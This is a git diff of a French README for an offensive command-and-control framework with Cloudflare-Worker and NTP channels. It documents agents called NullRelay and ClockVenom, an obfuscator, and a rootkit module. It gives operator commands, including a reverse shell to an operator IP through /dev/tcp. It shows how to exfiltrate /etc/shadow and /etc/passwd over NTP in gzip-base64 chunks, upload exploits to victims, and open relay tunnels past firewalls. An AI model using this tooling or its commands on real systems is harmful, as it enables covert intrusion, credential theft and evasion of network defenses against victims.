@@ -146,7 +146,7 @@ python3 ../../Obfuscator/shadowscript.py nullrelay.py
 
 ```bash
 # Voir les agents connectés
-C2_ADMIN_PORT=1337 python3 ../operator_cli.py agents
+C2_ADMIN_PORTS=1337 python3 ../operator_cli.py agents
 
 # Envoyer une commande (préfixe d'ID = 4 chars min)
 python3 ../operator_cli.py task 3685 "id && hostname"
@@ -259,13 +259,13 @@ C2_PSK=... C2_INT=15 C2_JITTER=5 nohup python3 /tmp/clockvenom.py > /tmp/clockve
 # Port admin NTP C2 = 1338
 
 # Voir les agents
-C2_ADMIN_PORT=1338 python3 operator_cli.py agents
+C2_ADMIN_PORTS=1338 python3 operator_cli.py agents
 
 # Envoyer une commande
-C2_ADMIN_PORT=1338 python3 operator_cli.py task 3685 "id && uname -r"
+C2_ADMIN_PORTS=1338 python3 operator_cli.py task 3685 "id && uname -r"
 
 # Attendre le résultat (l'agent doit faire un nouveau beacon)
-C2_ADMIN_PORT=1338 python3 operator_cli.py wait <task_id>
+C2_ADMIN_PORTS=1338 python3 operator_cli.py wait <task_id>
 ```
 
 ---
@@ -287,8 +287,9 @@ Fonctionne avec les deux canaux. Changer le port selon le canal.
 └─────────────────────────────────────────────────────────────────┘
 
 Variables d'environnement :
-  C2_ADMIN_PORT=1337   (Cloudflare, défaut)
-  C2_ADMIN_PORT=1338   (NTP)
+  C2_ADMIN_PORTS=1337        (Cloudflare uniquement)
+  C2_ADMIN_PORTS=1338        (NTP uniquement)
+  C2_ADMIN_PORTS=1338,1337   (les deux, défaut TUI)
 ```
 
 Exemples :
@@ -306,29 +307,26 @@ python3 operator_cli.py task 3685 "bash -i >& /dev/tcp/MON_IP/4444 0>&1"
 
 ## TUI — tableau de bord interactif (commun aux deux canaux)
 
-Pointée vers le bon port admin selon le canal utilisé :
+Lance automatiquement sur les deux canaux (lit `.env` dans le même dossier) :
 
 ```bash
 cd Modules/C2
-
-# Canal Cloudflare (admin port 1337)
-WORKER_URL=https://... C2_PSK=... C2_ADMIN_PORT=1337 python3 tui.py
-
-# Canal NTP (admin port 1338)
-C2_PSK=... C2_ADMIN_PORT=1338 python3 tui.py
+python3 tui.py
 ```
+
+Variables `.env` utilisées : `C2_ADMIN_PORTS` (défaut `1338,1337`), `WORKER_URL`, `C2_PSK`, `C2_HOST`.
 
 ```
 ┌──────────────────────────────────────────────────────┐
-│  [ Agents ]  [ Payload ]                             │
+│  [ Agents ]  [ Graphe ]  [ Payload ]                 │
 ├──────────────────────────────────────────────────────┤
 │  ID           Label        Dernière activité         │
-│  3685e93a     debian-vm    il y a 12s                │
-│  120ae267     my-laptop    il y a 3 min              │
+│  3685e93a     debian-vm    il y a 12s   (NTP)        │
+│  120ae267     my-laptop    il y a 3 min (CF)         │
 ├──────────────────────────────────────────────────────┤
 │  > commande : _                                      │
 └──────────────────────────────────────────────────────┘
-  r = refresh   Enter = sélectionner/envoyer   q = quitter
+  r = refresh   d = supprimer agent   q = quitter
 ```
 
 L'onglet **Payload** génère un agent personnalisé selon le type choisi :
@@ -336,6 +334,75 @@ L'onglet **Payload** génère un agent personnalisé selon le type choisi :
 - **ntp** : bake `ntp/clockvenom.py` avec `C2_PSK`, intervalle et jitter (pas de WORKER URL)
 
 Les deux modes supportent l'obfuscation automatique via `shadowscript.py`.
+
+### Commandes spéciales (`/module`)
+
+Saisir dans le champ de commande avec un agent sélectionné.
+
+#### `/module relay [start [port]]`
+
+Ouvre un tunnel TCP de retour vers le C2.
+
+```
+/module relay              # démarre le relay sur le port par défaut
+/module relay start 8443   # port personnalisé
+```
+
+- **Agent CF (NullRelay)** : ouvre un tunnel TCP sur le port spécifié (défaut 443) vers le Worker.
+- **Agent NTP (ClockVenom)** : ouvre un listener TCP local sur le port spécifié (défaut 123) qui forward vers `C2_HOST:443`. Supprime la limite de taille UDP/123 pour les commandes suivantes.
+
+#### `/module upload <local_path> [remote_path]`
+
+Envoie un fichier de la machine opérateur vers l'agent.
+
+```
+/module upload /tmp/exploit.py                  # → dépose dans /tmp/exploit.py sur la cible
+/module upload /tmp/exploit.py /opt/exp.py      # chemin distant personnalisé
+```
+
+Mécanisme : lit le fichier localement, base64-encode, envoie `echo '<b64>' | base64 -d > <remote_path>` comme commande shell à l'agent.
+
+Limite pratique : ~quelques MB (plafond CF Workers 100 MB). Pour de gros binaires, démarrer `/module relay` d'abord.
+
+#### `/module download <remote_path> [local_path]`
+
+Récupère un fichier depuis l'agent vers la machine opérateur.
+
+```
+/module download /etc/shadow                    # → sauvegardé dans downloads/shadow
+/module download /etc/shadow /tmp/shadow.txt    # chemin local personnalisé
+```
+
+Le comportement diffère selon le type d'agent :
+
+**Agent CF (NullRelay)** : envoie la commande `UPLOAD:<remote_path>` ; l'agent lit le fichier en binaire et retourne la base64 complète. Pas de limite de taille (plafond CF 100 MB). Un seul aller-retour.
+
+**Agent NTP (ClockVenom)** : protocole en deux phases, automatique et transparent :
+
+```
+Phase 1 — count task
+  TUI envoie : python3 -c "...gzip.compress(mtime=0)...print(nb_chunks)"
+  Agent répond : N  (nombre de chunks nécessaires)
+
+Phase 2 — N chunk tasks
+  TUI envoie tâche i : python3 -c "...b64[i*550:(i+1)*550]..."
+  Agent répond : 550 chars de base64 gzippé
+
+Réassemblage (boucle de collecte, toutes les 5s) :
+  concat → base64decode → gzip.decompress → écriture fichier
+```
+
+Débit approximatif (C2_INT=30s) :
+
+| Type de fichier | Chunks (ex. 10 KB) | Temps estimé |
+|---|---|---|
+| Texte / scripts (ratio gzip ×8) | ~4 | ~2 min |
+| Binaires (ratio gzip ×1.3) | ~25 | ~12 min |
+| `/etc/passwd` ~2 KB | 2 | ~1 min |
+
+> Pour tout fichier > ~50 KB sur agent NTP : lancer `/module relay` d'abord, puis utiliser `/module download` — le relay supprime la limite UDP et le fichier passe en un seul aller-retour (~30s).
+
+Les tâches de chunks sont visibles dans la liste des tâches. Cliquer sur une tâche chunk affiche sa progression (`chunk X/N, Y reçus`). Le log se met à jour automatiquement quand le téléchargement est terminé.
 
 ---
 
@@ -360,7 +427,7 @@ Les deux modes supportent l'obfuscation automatique via `shadowscript.py`.
 [ ] VPS : UDP/123 + TCP/443 ouverts dans firewall
 [ ] C2_PSK=... python3 ntp/server.py  (sur VPS, root)
 [ ] C2_PSK=... C2_INT=15 python3 /tmp/clockvenom.py  (sur cible)
-[ ] C2_ADMIN_PORT=1338 python3 operator_cli.py agents  → agent visible
+[ ] C2_ADMIN_PORTS=1338 python3 operator_cli.py agents  → agent visible
 ```
 
 ---
@@ -373,5 +440,5 @@ Les deux modes supportent l'obfuscation automatique via `shadowscript.py`.
 | Tâche reste `sent` | Agent ne beacon pas / tâche perdue | Vérifier que l'agent tourne, re-queue la tâche |
 | NTP : agent résoud la vraie IP | Rootkit pas chargé / comm pas `ntp-agent` | `insmod ironveil.ko`, vérifier via mmap |
 | NTP : beacon timeout | UDP/123 bloqué ET TCP/443 bloqué | Vérifier firewall VPS et NAT victime |
-| NTP : résultat jamais reçu | Paquet trop grand (> 203B réseau) | Sortie tronquée à 120 chars automatiquement |
+| NTP : download incomplet / corrompu | Fichier trop grand pour UDP (> ~650B raw) | Utiliser `/module relay` puis relancer `/module download` |
 | Cloudflare : 404 sur Worker | WORKER_SECRET incorrect | Recalculer token avec même PSK |
